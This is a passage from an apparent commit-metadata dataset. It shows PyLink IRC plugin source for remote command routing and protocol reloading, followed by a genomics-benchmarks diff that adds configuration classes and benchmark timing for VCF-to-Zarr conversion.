irc.name !=placeholder_self.name, \\ \"Refusing to route reply back to the same \" \\ \"network, as this would cause a recursive loop\" log.debug('(%s) networks.remote: re-routing reply %r from network %s', irc.name, text, placeholder_self.name) if 'source' in kwargs: del kwargs['source'] irc.reply(text, source=irc.pseudoclient.uid, **kwargs) old_reply=remoteirc.reply with remoteirc.reply_lock: try: log.debug('(%s) networks.remote: overriding reply() of IRC object %s', irc.name, netname) remoteirc.reply=types.MethodType(_remote_reply, remoteirc) world.services[args.service].call_cmd(remoteirc, remoteirc.pseudoclient.uid, ' '.join(args.command)) finally: log.debug('(%s) networks.remote: restoring reply() of IRC object %s', irc.name, netname) remoteirc.reply=old_reply remoteirc.pseudoclient.account='' @utils.add_cmd def reloadproto(irc, source, args): \"\"\"<protocol module name> Reloads the given protocol module without restart. You will have to manually disconnect and reconnect any network using the module for changes to apply.\"\"\" permissions.checkPermissions(irc, source,['networks.reloadproto']) try: name=args[0] except IndexError: irc.error('Not enough arguments(needs 1: protocol module name)') return proto=utils.getProtocolModule(name) importlib.reload(proto) irc.reply(\"Done. You will have to manually disconnect and reconnect any network using the %r module for changes to apply.\" % name) ", "sourceWithComments": "\"\"\"Networks plugin - allows you to manipulate connections to various configured networks.\"\"\"\nimport importlib\nimport types\n\nfrom pylinkirc import utils, world, conf, classes\nfrom pylinkirc.log import log\nfrom pylinkirc.coremods import control, permissions\n\n@utils.add_cmd\ndef disconnect(irc, source, args):\n    \"\"\"<network>\n\n    Disconnects the network <network>. When all networks are disconnected, PyLink will automatically exit.\n\n    To reconnect a network disconnected using this command, use REHASH to reload the networks list.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.disconnect'])\n    try:\n        netname = args[0]\n        network = world.networkobjects[netname]\n    except IndexError:  # No argument given.\n        irc.error('Not enough arguments (needs 1: network name (case sensitive)).')\n        return\n    except KeyError:  # Unknown network.\n        irc.error('No such network \"%s\" (case sensitive).' % netname)\n        return\n    irc.reply(\"Done. If you want to reconnect this network, use the 'rehash' command.\")\n\n    control.remove_network(network)\n\n@utils.add_cmd\ndef autoconnect(irc, source, args):\n    \"\"\"<network> <seconds>\n\n    Sets the autoconnect time for <network> to <seconds>.\n    You can disable autoconnect for a network by setting <seconds> to a negative value.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.autoconnect'])\n    try:\n        netname = args[0]\n        seconds = float(args[1])\n        network = world.networkobjects[netname]\n    except IndexError:  # Arguments not given.\n        irc.error('Not enough arguments (needs 2: network name (case sensitive), autoconnect time (in seconds)).')\n        return\n    except KeyError:  # Unknown network.\n        irc.error('No such network \"%s\" (case sensitive).' % netname)\n        return\n    except ValueError:\n        irc.error('Invalid argument \"%s\" for <seconds>.' % seconds)\n        return\n    network.serverdata['autoconnect'] = seconds\n    irc.reply(\"Done.\")\n\nremote_parser = utils.IRCParser()\nremote_parser.add_argument('network')\nremote_parser.add_argument('--service', type=str, default='pylink')\nremote_parser.add_argument('command', nargs=utils.IRCParser.REMAINDER)\n@utils.add_cmd\ndef remote(irc, source, args):\n    \"\"\"<network> [--service <service name>] <command>\n\n    Runs <command> on the remote network <network>. Plugin responses sent using irc.reply() are\n    supported and returned here, but others are dropped due to protocol limitations.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.remote'])\n\n    args = remote_parser.parse_args(args)\n    netname = args.network\n\n    if netname == irc.name:\n        # This would actually throw _remote_reply() into a loop, so check for it here...\n        # XXX: properly fix this.\n        irc.error(\"Cannot remote-send a command to the local network; use a normal command!\")\n        return\n\n    try:\n        remoteirc = world.networkobjects[netname]\n    except KeyError:  # Unknown network.\n        irc.error('No such network \"%s\" (case sensitive).' % netname)\n        return\n\n    if args.service not in world.services:\n        irc.error('Unknown service %r.' % args.service)\n        return\n\n    # Force remoteirc.called_in to something private in order to prevent\n    # accidental information leakage from replies.\n    remoteirc.called_in = remoteirc.called_by = remoteirc.pseudoclient.uid\n\n    # Set the identification override to the caller's account.\n    remoteirc.pseudoclient.account = irc.users[source].account\n\n    def _remote_reply(placeholder_self, text, **kwargs):\n        \"\"\"\n        reply() rerouter for the 'remote' command.\n        \"\"\"\n        assert irc.name != placeholder_self.name, \\\n            \"Refusing to route reply back to the same \" \\\n            \"network, as this would cause a recursive loop\"\n        log.debug('(%s) networks.remote: re-routing reply %r from network %s', irc.name,\n                  text, placeholder_self.name)\n\n        # Override the source option to make sure the source is valid on the local network.\n        if 'source' in kwargs:\n            del kwargs['source']\n        irc.reply(text, source=irc.pseudoclient.uid, **kwargs)\n\n    old_reply = remoteirc.reply\n\n    with remoteirc.reply_lock:\n        try:  # Remotely call the command (use the PyLink client as a dummy user).\n            # Override the remote irc.reply() to send replies HERE.\n            log.debug('(%s) networks.remote: overriding reply() of IRC object %s', irc.name, netname)\n            remoteirc.reply = types.MethodType(_remote_reply, remoteirc)\n            world.services[args.service].call_cmd(remoteirc, remoteirc.pseudoclient.uid,\n                                                  ' '.join(args.command))\n        finally:\n            # Restore the original remoteirc.reply()\n            log.debug('(%s) networks.remote: restoring reply() of IRC object %s', irc.name, netname)\n            remoteirc.reply = old_reply\n            # Remove the identification override after we finish.\n            remoteirc.pseudoclient.account = ''\n\n@utils.add_cmd\ndef reloadproto(irc, source, args):\n    \"\"\"<protocol module name>\n\n    Reloads the given protocol module without restart. You will have to manually disconnect and reconnect any network using the module for changes to apply.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.reloadproto'])\n    try:\n        name = args[0]\n    except IndexError:\n        irc.error('Not enough arguments (needs 1: protocol module name)')\n        return\n\n    proto = utils.getProtocolModule(name)\n    importlib.reload(proto)\n\n    irc.reply(\"Done. You will have to manually disconnect and reconnect any network using the %r module for changes to apply.\" % name)\n"}}, "msg": "Split Irc.reply() into _reply() to make 'networks.remote' actually thread-safe\n\nPreviously, the Irc.reply_lock check was in the reply() function itself: replacing it with another function checking for the same lock would delay execution,\nbut then run the wrong reply() code if another module used irc.reply() while 'remote' was executing."}}, "https://github.com/ornl-oxford/genomics-benchmarks": {"5577269b7283a48d0b421dabd44687460955a0c8": {"url": "https://api.github.com/repos/ornl-oxford/genomics-benchmarks/commits/5577269b7283a48d0b421dabd44687460955a0c8", "html_url": "https://github.com/ornl-oxford/genomics-benchmarks/commit/5577269b7283a48d0b421dabd44687460955a0c8", "message": "Implement Benchmark Process (#29)\n\n* Update project environment, default config file, and AUTHORS\r\n\r\n-Update .gitignore to ignore test config file and IntelliJ IDEA project files\r\n-Update AUTHORS file with new contributor\r\n-Environment: Add perf and numcodecs libraries as dependencies\r\n-Config file: Update file to include spaces for consistency\r\n-Update benchmark config file to include new (future) options for ftp download and data conversion\r\n\r\n* Remove IntelliJ IDE files from code base\r\n\r\n* -Create config.py to hold functions/data for config file parsing and handling\r\n-cli.py: Move configuration-related functions to config.py & create main() function\r\n-test_cli.py: Move configuration-related unit tests to test_config.py\r\n-Update README.md to show that -f flag can be used when generating a configuration file\r\n\r\n* Add placeholder methods for unit testing: generate default configuration w/ and w/o -f flag\r\n\r\n* Begin implementing \"setup\" command, including download of files over FTP\r\n\r\n- cli.py: Add logic when running in setup mode\r\n- config.py: Add ability to read/parse configuration settings related to FTP downloader\r\n- data_service.py: Implement ftp downloading, including the ability to download all files within a remote ftp directory (recursive download)\r\n- test_data_service.py: Add unit tests for ftp download checking\r\n\r\n* Add unittest for default configuration file generation\r\n\r\n* Update config unittests\r\n\r\n- test_config.py: Add two new unit tests to ensure that a file is not overwritten normally, and that a file is overwritten while using the overwrite flag\r\n\r\n* Add two files needed for data service unit testing and update .gitignore\r\n\r\n- Update .gitignore to only ignore root level data directory\r\n- Add two missing files needed for unit testing Data Service\r\n\r\n* WIP: Add VCF to Zarr conversion (currently only uses Blosc compressor with no user configuration availalbe)\r\n\r\n* FTP Bugfix: Create local directory if it does not exist, before trying to save files to local directory\r\n\r\n* VCF to Zarr: Take downloaded files (vcf, vcf.gz) and organize them to prepare for Zarr conversion during benchmark execution\r\n\r\n* core.py: Follow PEP8\r\n\r\n* Add ability to control VCF to Zarr conversion settings from configuration file (Blosc compressor only for now)\r\n\r\nAvailable Blosc compressor algorithms: zstd, blosclz, lz4, lz4hc, zlib, snappy\r\n\r\n* Convert VCF to Zarr during Setup mode\r\n\r\n- Restructure/add new folders for dataset storage\r\n- Add conversion of VCF files to Zarr format during Setup mode\r\n- data-service: Create function to remove directory tree\r\n- Various code cleanup/formatting\r\n\r\n* Add benchmarking configuration options and parsing\r\n\r\n*  - Move data directory declarations to a separate class in data_service\r\n - Add skeleton code to benchmark core\r\n\r\n* - cli.py: Use run_(timestamp) as default label for benchmark, pass label into benchmark core\r\n- config.py: Store VCF to Zarr conversion config data in Benchmark configuration data so that settings are known when running the benchmark\r\n- core.py: Begin implementation of benchmark process, create BenchmarkRunner class to time different tasks, add benchmarking of vcf to zarr conversion process, save benchmark results to psv file\r\n- data_service.py: Update benchmark_vcf_to_zarr function to have hooks for benchmark timing when needed\r\n- requirements.txt: Add pandas to list of requirements, which is used for storing benchmark results\r\n\r\n* Code cleanup and paramater documentation\r\n\r\n* Rename BenchmarkRunner to BenchmarkProfiler, create new Benchmark class to hold all benchmarking-related code\r\n\r\n- Rename BenchmarkRunner to BenchmarkProfiler class\r\n- Add two unittest method stubs\r\n- core.py: Move benchmarking process inside new Benchmark Class for better code organization/separation\r\n- core.py: Move record_runtime function to internal function within BenchmarkProfiler class\r\n\r\n* Implement unit tests for benchmark profiler and results data\r\n\r\n* Update comment for clarity\r\n\r\n* data_service: Create function that returns genotype data from callset\r\n  Supports data sets with differing formats (e.g. callset/GT vs. callset/genotype)\r\n\r\n* Bugfix: Use an OrderedDict instead of dict to contain benchmark results. Previously, order was not preserved on Linux- and Mac-based systems using Python 3.5\r\n\r\n* numcodecs: remove unused imports\r\n\r\n* Remove unused imports for module (resulting in circular references?)", "sha": "5577269b7283a48d0b421dabd44687460955a0c8", "keyword": "remote code execution check", "diff": "diff --git a/benchmark/cli.py b/benchmark/cli.py\nindex ed3905a..7b841aa 100644\n--- a/benchmark/cli.py\n+++ b/benchmark/cli.py\n@@ -3,12 +3,13 @@\n runs the benchmarks, and records the timer results. \"\"\"\n \n import argparse  # for command line parsing\n+import datetime\n import time  # for benchmark timer\n import csv  # for writing results\n import logging\n import sys\n import shutil\n-from benchmark import config, data_service\n+from benchmark import core, config, data_service\n \n \n def get_cli_arguments():\n@@ -41,8 +42,10 @@ def get_cli_arguments():\n \n     benchmark_exec_parser = subparser.add_parser(\"exec\",\n                                                  help='Execution of the benchmark modes. It requires a configuration file.')\n-    # TODO: use run_(timestamp) as default\n-    benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\",\n+\n+    timestamp_current = datetime.datetime.fromtimestamp(time.time())\n+    benchmark_label_default = \"run_{timestamp}\".format(timestamp=timestamp_current.strftime(\"%Y-%m-%d_%H-%M-%S\"))\n+    benchmark_exec_parser.add_argument(\"--label\", type=str, default=benchmark_label_default, metavar=\"RUN_LABEL\",\n                                        help=\"Label for the benchmark run.\")\n     benchmark_exec_parser.add_argument(\"--config_file\", type=str, required=True,\n                                        help=\"Specify the path to a configuration file.\", metavar=\"FILEPATH\")\n@@ -52,12 +55,7 @@ def get_cli_arguments():\n \n \n def _main():\n-    input_directory = \"./data/input/\"\n-    download_directory = input_directory + \"download/\"\n-    temp_directory = \"./data/temp/\"\n-    vcf_directory = \"./data/vcf/\"\n-    zarr_directory_setup = \"./data/zarr/\"\n-    zarr_directory_benchmark = \"./data/zarr_benchmark/\"\n+    data_dirs = config.DataDirectoriesConfigurationRepresentation()\n \n     cli_arguments = get_cli_arguments()\n \n@@ -71,8 +69,8 @@ def _main():\n         print(\"[Setup] Setting up benchmark data.\")\n \n         # Clear out existing files in VCF and Zarr directories\n-        data_service.remove_directory_tree(vcf_directory)\n-        data_service.remove_directory_tree(zarr_directory_setup)\n+        data_service.remove_directory_tree(data_dirs.vcf_dir)\n+        data_service.remove_directory_tree(data_dirs.zarr_dir_setup)\n \n         # Get runtime config from specified location\n         runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n@@ -82,32 +80,40 @@ def _main():\n \n         if ftp_config.enabled:\n             print(\"[Setup][FTP] FTP module enabled. Running FTP download...\")\n-            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)\n+            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=data_dirs.download_dir)\n         else:\n             print(\"[Setup][FTP] FTP module disabled. Skipping FTP download...\")\n \n         # Process/Organize downloaded files\n-        data_service.process_data_files(input_dir=input_directory,\n-                                        temp_dir=temp_directory,\n-                                        output_dir=vcf_directory)\n+        data_service.process_data_files(input_dir=data_dirs.input_dir,\n+                                        temp_dir=data_dirs.temp_dir,\n+                                        output_dir=data_dirs.vcf_dir)\n \n         # Convert VCF files to Zarr format if the module is enabled\n         vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n         if vcf_to_zarr_config.enabled:\n-            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,\n-                                           output_zarr_dir=zarr_directory_setup,\n+            data_service.setup_vcf_to_zarr(input_vcf_dir=data_dirs.vcf_dir,\n+                                           output_zarr_dir=data_dirs.zarr_dir_setup,\n                                            conversion_config=vcf_to_zarr_config)\n     elif command == \"exec\":\n         print(\"[Exec] Executing benchmark tool.\")\n \n+        # Clear out existing files in Zarr benchmark directory\n+        data_service.remove_directory_tree(data_dirs.zarr_dir_benchmark)\n+\n         # Get runtime config from specified location\n         runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n \n-        # Get VCF to Zarr conversion settings from runtime config\n-        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n+        benchmark_label = cli_arguments[\"label\"]\n+\n+        # Get Benchmark module settings from runtime config\n+        benchmark_config = config.BenchmarkConfigurationRepresentation(runtime_config)\n+\n+        # Setup the benchmark runner\n+        benchmark = core.Benchmark(bench_conf=benchmark_config, data_dirs=data_dirs, benchmark_label=benchmark_label)\n \n-        # TODO: Convert necessary VCF files to Zarr format\n-        # data_service.convert_to_zarr(\"./data/vcf/chr22.1000.vcf\", \"./data/zarr/chr22.1000.zarr\", vcf_to_zarr_config)\n+        # Run the benchmark\n+        benchmark.run_benchmark()\n     else:\n         print(\"Error: Unexpected command specified. Exiting...\")\n         sys.exit(1)\ndiff --git a/benchmark/config.py b/benchmark/config.py\nindex 200740b..0441b81 100644\n--- a/benchmark/config.py\n+++ b/benchmark/config.py\n@@ -13,6 +13,15 @@ def config_str_to_bool(input_str):\n     return input_str.lower() in ['true', '1', 't', 'y', 'yes']\n \n \n+class DataDirectoriesConfigurationRepresentation:\n+    input_dir = \"./data/input/\"\n+    download_dir = input_dir + \"download/\"\n+    temp_dir = \"./data/temp/\"\n+    vcf_dir = \"./data/vcf/\"\n+    zarr_dir_setup = \"./data/zarr/\"\n+    zarr_dir_benchmark = \"./data/zarr_benchmark/\"\n+\n+\n def isint(value):\n     try:\n         int(value)\n@@ -99,6 +108,7 @@ def __init__(self, runtime_config=None):\n class VCFtoZarrConfigurationRepresentation:\n     \"\"\" Utility class for object representation of VCF to Zarr conversion module configuration. \"\"\"\n     enabled = False  # Specifies whether the VCF to Zarr conversion module should be enabled or not\n+    fields = None\n     alt_number = None  # Alt number to use when converting to Zarr format. If None, then this will need to be determined\n     chunk_length = None  # Number of variants of chunks in which data are processed. If None, use default value\n     chunk_width = None  # Number of samples to use when storing chunks in output. If None, use default value\n@@ -182,6 +192,47 @@ def __init__(self, runtime_config=None):\n                                         \"blosc_shuffle_mode could not be converted to integer.\")\n \n \n+benchmark_data_input_types = [\"vcf\", \"zarr\"]\n+\n+\n+class BenchmarkConfigurationRepresentation:\n+    \"\"\" Utility class for object representation of the benchmark module's configuration. \"\"\"\n+    benchmark_number_runs = 5\n+    benchmark_data_input = \"vcf\"\n+    benchmark_dataset = \"\"\n+    benchmark_allele_count = False\n+    benchmark_PCA = False\n+    vcf_to_zarr_config = None\n+\n+    def __init__(self, runtime_config=None):\n+        \"\"\"\n+        Creates an object representation of the Benchmark module's configuration data.\n+        :param runtime_config: runtime_config data to extract benchmark configuration from\n+        :type runtime_config: ConfigurationRepresentation\n+        \"\"\"\n+        if runtime_config is not None:\n+            if hasattr(runtime_config, \"benchmark\"):\n+                # Extract relevant settings from config file\n+                if \"benchmark_number_runs\" in runtime_config.benchmark:\n+                    try:\n+                        self.benchmark_number_runs = int(runtime_config.benchmark[\"benchmark_number_runs\"])\n+                    except ValueError:\n+                        pass\n+                if \"benchmark_data_input\" in runtime_config.benchmark:\n+                    benchmark_data_input_temp = runtime_config.benchmark[\"benchmark_data_input\"]\n+                    if benchmark_data_input_temp in benchmark_data_input_types:\n+                        self.benchmark_data_input = benchmark_data_input_temp\n+                if \"benchmark_dataset\" in runtime_config.benchmark:\n+                    self.benchmark_dataset = runtime_config.benchmark[\"benchmark_dataset\"]\n+                if \"benchmark_allele_count\" in runtime_config.benchmark:\n+                    self.benchmark_allele_count = config_str_to_bool(runtime_config.benchmark[\"benchmark_allele_count\"])\n+                if \"benchmark_PCA\" in runtime_config.benchmark:\n+                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"])\n+\n+            # Add the VCF to Zarr Conversion Configuration Data\n+            self.vcf_to_zarr_config = VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config)\n+\n+\n def read_configuration(location):\n     \"\"\"\n     Args: location of the configuration file, existing configuration dictionary\ndiff --git a/benchmark/core.py b/benchmark/core.py\nindex fd4acbc..456a0c5 100644\n--- a/benchmark/core.py\n+++ b/benchmark/core.py\n@@ -2,31 +2,170 @@\n determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\n runs the benchmarks, and records the timer results. \"\"\"\n \n+import allel\n+import zarr\n+import datetime\n import time  # for benchmark timer\n import csv  # for writing results\n import logging\n+import os\n+import pandas as pd\n+from collections import OrderedDict\n+from benchmark import config, data_service\n \n \n-def run_benchmark(bench_conf):\n-    pass\n+class BenchmarkResultsData:\n+    run_number = None\n+    operation_name = None\n+    start_time = None\n+    exec_time = None\n \n+    def to_dict(self):\n+        return OrderedDict([(\"Log Timestamp\", datetime.datetime.fromtimestamp(self.start_time)),\n+                            (\"Run Number\", self.run_number),\n+                            (\"Operation\", self.operation_name),\n+                            (\"Execution Time\", self.exec_time)])\n \n-def run_dynamic(ftp_location):\n-    pass\n+    def to_pandas(self):\n+        data = self.to_dict()\n+        df = pd.DataFrame(data, index=[1])\n+        df.index.name = '#'\n+        return df\n \n \n-def run_static():\n-    pass\n+class BenchmarkProfiler:\n+    benchmark_running = False\n \n+    def __init__(self, benchmark_label):\n+        self.results = BenchmarkResultsData()\n+        self.benchmark_label = benchmark_label\n \n-def get_remote_files(ftp_server, ftp_directory, files=None):\n-    pass\n+    def set_run_number(self, run_number):\n+        if not self.benchmark_running:\n+            self.results.run_number = run_number\n \n+    def start_benchmark(self, operation_name):\n+        if not self.benchmark_running:\n+            self.results.operation_name = operation_name\n \n-def record_runtime(benchmark, timestamp):\n-    pass\n+            self.benchmark_running = True\n \n+            # Start the benchmark timer\n+            self.results.start_time = time.time()\n \n-# temporary here\n-def main():\n-    pass\n+    def end_benchmark(self):\n+        if self.benchmark_running:\n+            end_time = time.time()\n+\n+            # Calculate the execution time from start and end times\n+            self.results.exec_time = end_time - self.results.start_time\n+\n+            # Save benchmark results\n+            self._record_runtime(self.results, \"{}.psv\".format(self.benchmark_label))\n+\n+            self.benchmark_running = False\n+\n+    def get_benchmark_results(self):\n+        return self.results\n+\n+    def _record_runtime(self, benchmark_results, output_filename):\n+        \"\"\"\n+        Records the benchmark results data entry to the specified PSV file.\n+        :param benchmark_results: BenchmarkResultsData object containing the benchmark results data\n+        :param output_filename: Which file to output the benchmark results to\n+        :type benchmark_results: BenchmarkResultsData\n+        :type output_filename: str\n+        \"\"\"\n+        output_filename = str(output_filename)\n+\n+        psv_header = not os.path.isfile(output_filename)\n+\n+        # Open the output file in append mode\n+        with open(output_filename, \"a\") as psv_file:\n+            pd_results = benchmark_results.to_pandas()\n+            pd_results.to_csv(psv_file, sep=\"|\", header=psv_header, index=False)\n+\n+\n+class Benchmark:\n+    benchmark_zarr_dir = \"\"  # Directory for which to use data from for benchmark process\n+    benchmark_zarr_file = \"\"  # File within benchmark_zarr_dir for which to use for benchmark process\n+\n+    def __init__(self, bench_conf, data_dirs, benchmark_label):\n+        \"\"\"\n+        Sets up a Benchmark object which is used to execute benchmarks.\n+        :param bench_conf: Benchmark configuration data that controls the benchmark execution\n+        :param data_dirs: DataDirectoriesConfigurationRepresentation object that contains working data directories\n+        :param benchmark_label: label to use when saving benchmark results to file\n+        :type bench_conf: config.BenchmarkConfigurationRepresentation\n+        :type data_dirs: config.DataDirectoriesConfigurationRepresentation\n+        :type benchmark_label: str\n+        \"\"\"\n+        self.bench_conf = bench_conf\n+        self.data_dirs = data_dirs\n+        self.benchmark_label = benchmark_label\n+\n+        self.benchmark_profiler = BenchmarkProfiler(benchmark_label=self.benchmark_label)\n+\n+    def run_benchmark(self):\n+        \"\"\"\n+        Executes the benchmarking process.\n+        \"\"\"\n+        if self.bench_conf is not None and self.data_dirs is not None:\n+            for run_number in range(1, self.bench_conf.benchmark_number_runs + 1):\n+                # Clear out existing files in Zarr benchmark directory\n+                # (Should be done every single run)\n+                data_service.remove_directory_tree(self.data_dirs.zarr_dir_benchmark)\n+\n+                # Update run number in benchmark profiler (for results tracking)\n+                self.benchmark_profiler.set_run_number(run_number)\n+\n+                # Prepare data directory and file locations for benchmarks\n+                if self.bench_conf.benchmark_data_input == \"vcf\":\n+                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark\n+\n+                    # Convert VCF data to Zarr format as part of benchmark\n+                    self._benchmark_convert_to_zarr()\n+\n+                elif self.bench_conf.benchmark_data_input == \"zarr\":\n+                    # Use pre-converted Zarr data which was done ahead of benchmark (i.e. in Setup mode)\n+                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_setup\n+                    self.benchmark_zarr_file = self.bench_conf.benchmark_dataset\n+\n+                else:\n+                    print(\"[Exec] Error: Invalid option supplied for benchmark data input format.\")\n+                    print(\"  - Expected data input formats: vcf, zarr\")\n+                    print(\"  - Provided data input format: {}\".format(self.bench_conf.benchmark_data_input))\n+                    exit(1)\n+\n+                # Ensure Zarr dataset exists and can be used for upcoming benchmarks\n+                benchmark_zarr_path = os.path.join(self.benchmark_zarr_dir, self.benchmark_zarr_file)\n+                if (benchmark_zarr_path != \"\") and (os.path.isdir(benchmark_zarr_path)):\n+                    # TODO: Run remaining benchmarks (e.g. loading into memory, allele counting, PCA, etc.)\n+                    pass\n+                else:\n+                    # Zarr dataset doesn't exist. Print error message and exit\n+                    print(\"[Exec] Error: Zarr dataset could not be found for benchmarking.\")\n+                    print(\"  - Zarr dataset location: {}\".format(benchmark_zarr_path))\n+\n+    def _benchmark_convert_to_zarr(self):\n+        self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark\n+        input_vcf_file = self.bench_conf.benchmark_dataset\n+        input_vcf_path = os.path.join(self.data_dirs.vcf_dir, input_vcf_file)\n+\n+        if os.path.isfile(input_vcf_path):\n+            output_zarr_file = input_vcf_file\n+            output_zarr_file = output_zarr_file[\n+                               0:len(output_zarr_file) - 4]  # Truncate *.vcf from input filename\n+            output_zarr_path = os.path.join(self.data_dirs.zarr_dir_benchmark, output_zarr_file)\n+\n+            data_service.convert_to_zarr(input_vcf_path=input_vcf_path,\n+                                         output_zarr_path=output_zarr_path,\n+                                         conversion_config=self.bench_conf.vcf_to_zarr_config,\n+                                         benchmark_runner=self.benchmark_profiler)\n+\n+            self.benchmark_zarr_file = output_zarr_file\n+        else:\n+            print(\"[Exec] Error: Dataset specified in configuration file does not exist. Exiting...\")\n+            print(\"  - Dataset file specified in configuration: {}\".format(input_vcf_file))\n+            print(\"  - Expected file location: {}\".format(input_vcf_path))\n+            exit(1)\ndiff --git a/benchmark/data_service.py b/benchmark/data_service.py\nindex 323ebd3..83e89cf 100644\n--- a/benchmark/data_service.py\n+++ b/benchmark/data_service.py\n@@ -15,8 +15,7 @@\n import numpy as np\n import zarr\n import numcodecs\n-from numcodecs import Blosc, LZ4, LZMA\n-from benchmark import config\n+from numcodecs import Blosc\n \n import gzip\n import shutil\n@@ -279,19 +278,25 @@ def setup_vcf_to_zarr(input_vcf_dir, output_zarr_dir, conversion_config):\n                         conversion_config=conversion_config)\n \n \n-def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):\n+def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchmark_runner=None):\n     \"\"\" Converts the original data (VCF) to a Zarr format. Only converts a single VCF file.\n+    If a BenchmarkRunner is provided, the actual VCF to Zarr conversion process will be benchmarked.\n     :param input_vcf_path: The input VCF file location\n     :param output_zarr_path: The desired Zarr output location\n     :param conversion_config: Configuration data for the conversion\n+    :param benchmark_runner: BenchmarkRunner object to be used for benchmarking process\n     :type input_vcf_path: str\n     :type output_zarr_path: str\n     :type conversion_config: config.VCFtoZarrConfigurationRepresentation\n+    :type benchmark_runner: core.BenchmarkProfiler\n     \"\"\"\n     if conversion_config is not None:\n         # Ensure var is string, not pathlib.Path\n         output_zarr_path = str(output_zarr_path)\n \n+        # Get fields to extract (for unit testing only)\n+        fields = conversion_config.fields\n+\n         # Get alt number\n         if conversion_config.alt_number is None:\n             print(\"[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.\")\n@@ -324,10 +329,42 @@ def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):\n         else:\n             raise ValueError(\"Unexpected compressor type specified.\")\n \n-        print(\"[VCF-Zarr] Using {} compressor.\".format(conversion_config.compressor))\n+        if benchmark_runner is not None:\n+            benchmark_runner.start_benchmark(operation_name=\"Convert VCF to Zarr\")\n \n-        print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\")\n         # Perform the VCF to Zarr conversion\n-        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,\n+        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True, fields=fields,\n                           log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width)\n-        print(\"[VCF-Zarr] Done.\")\n+\n+        if benchmark_runner is not None:\n+            benchmark_runner.end_benchmark()\n+\n+\n+GENOTYPE_ARRAY_NORMAL = 0\n+GENOTYPE_ARRAY_DASK = 1\n+GENOTYPE_ARRAY_CHUNKED = 2\n+\n+\n+def get_genotype_data(callset, genotype_array_type=GENOTYPE_ARRAY_DASK):\n+    genotype_ref_name = ''\n+\n+    # Ensure 'calldata' is within the callset\n+    if 'calldata' in callset:\n+        # Try to find either GT or genotype in calldata\n+        if 'GT' in callset['calldata']:\n+            genotype_ref_name = 'GT'\n+        elif 'genotype' in callset['calldata']:\n+            genotype_ref_name = 'genotype'\n+        else:\n+            return None\n+    else:\n+        return None\n+\n+    if genotype_array_type == GENOTYPE_ARRAY_NORMAL:\n+        return allel.GenotypeArray(callset['calldata'][genotype_ref_name])\n+    elif genotype_array_type == GENOTYPE_ARRAY_DASK:\n+        return allel.GenotypeDaskArray(callset['calldata'][genotype_ref_name])\n+    elif genotype_array_type == GENOTYPE_ARRAY_CHUNKED:\n+        return allel.GenotypeChunkedArray(callset['calldata'][genotype_ref_name])\n+    else:\n+        return None\ndiff --git a/doc/benchmark.conf b/doc/benchmark.conf\nindex 813a34a..75a82ac 100644\n--- a/doc/benchmark.conf\n+++ b/doc/benchmark.conf\n@@ -21,5 +21,12 @@ blosc_compression_algorithm = zstd\n blosc_compression_level = 1\n blosc_shuffle_mode = -1\n \n+[benchmark]\n+benchmark_number_runs = 5\n+benchmark_data_input = vcf\n+benchmark_dataset =\n+benchmark_allele_count = True\n+benchmark_PCA = False\n+\n [output]\n output_results = ~/benchmark/results.psv\ndiff --git a/doc/benchmark.conf.default b/doc/benchmark.conf.default\nindex c59a442..2310dc2 100644\n--- a/doc/benchmark.conf.default\n+++ b/doc/benchmark.conf.default\n@@ -4,7 +4,8 @@ run_mode = fetch_data\n \n [ftp]\n \n-# Whether or not the FTP downloader module should be used when running benchmark tool in Setup mode.\n+# Whether or not the FTP downloader module should be used when running benchmark\n+# tool in Setup mode.\n enabled = False\n \n # FTP Server to retrieve files from:\n@@ -22,7 +23,7 @@ use_tls = False\n directory = files\n \n # File or list of files to download within {directory}.\n-#  - If downloading list of files, names should be separated using \n+#  - If downloading list of files, names should be separated using\n #    delimiter specified in {file_delimiter}.\n #  - To download all files within {directory}, set {files} to \"*\" (without quotes).\n files = sample.vcf\n@@ -36,6 +37,8 @@ file_delimiter = |\n \n # Whether or not the VCF to Zarr Converter module should be used when running\n # benchmark tool in Setup mode.\n+# Note: To run VCF to Zarr conversion as part of the benchmark process, see\n+#       the [benchmark] configuration section.\n enabled = False\n \n # Alt number to assume when converting to Zarr format.\n@@ -76,5 +79,30 @@ blosc_compression_level = 1\n #   - AUTOSHUFFLE:  -1\n blosc_shuffle_mode = -1\n \n+[benchmark]\n+\n+# Specifies how many times the benchmark tool should run\n+# each available benchmark.\n+benchmark_number_runs = 5\n+\n+# Specifies where the benchmark tool should get its data from.\n+# Possible Values:\n+#   - vcf:  uses datasets within the ./data/vcf/ directory. This option will\n+#           result in VCF data being converted to Zarr format as part of the\n+#           benchmarking process.\n+#   - zarr: uses Zarr-formtted datasets within the ./data/zarr/ directory. This\n+#           option will result in skipping the benchmark of the VCF to Zarr\n+#           conversion process.\n+benchmark_data_input = vcf\n+\n+# Specifies which dataset to use for the benchmarking process.\n+benchmark_dataset =\n+\n+# Enables/disables running 